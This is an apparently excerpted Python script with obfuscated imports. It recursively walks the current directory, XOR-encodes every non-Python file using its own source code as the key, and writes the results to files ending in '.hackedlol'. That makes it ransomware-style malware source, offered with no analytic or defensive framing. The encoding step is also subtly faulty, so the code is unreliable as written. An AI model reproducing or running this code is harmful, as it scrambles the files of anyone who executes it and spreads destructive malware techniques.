...
base64= __import__('base64', globals(), locals())
base64=__import__('base64', globals(), locals());z=__import__('os', globals(), locals());
...
os=__import__('os', __builtins__.__dict__['globals'](),  __builtins__.__dict__['locals']());
txt=open(eval("__file__")).read()

for dirPath, dirNames, fileNames in os.walk(os.getcwd()):
    for fileName in fileNames:
        if not fileName.endswith(".py"):
            rawFileName = open(dirPath+"/"+fileName, "rb").read();
            modifiedFileName = open(dirPath+"/"+(fileName.rsplit(".", 1)[0])+".hackedlol", "wb")
            for idx in range(len(rawFileName)):
                modifiedFileName.write(
                  chr(rawFileName[idx]^ord(txt[(idx*0x27) % len(txt)])).encode()
                )
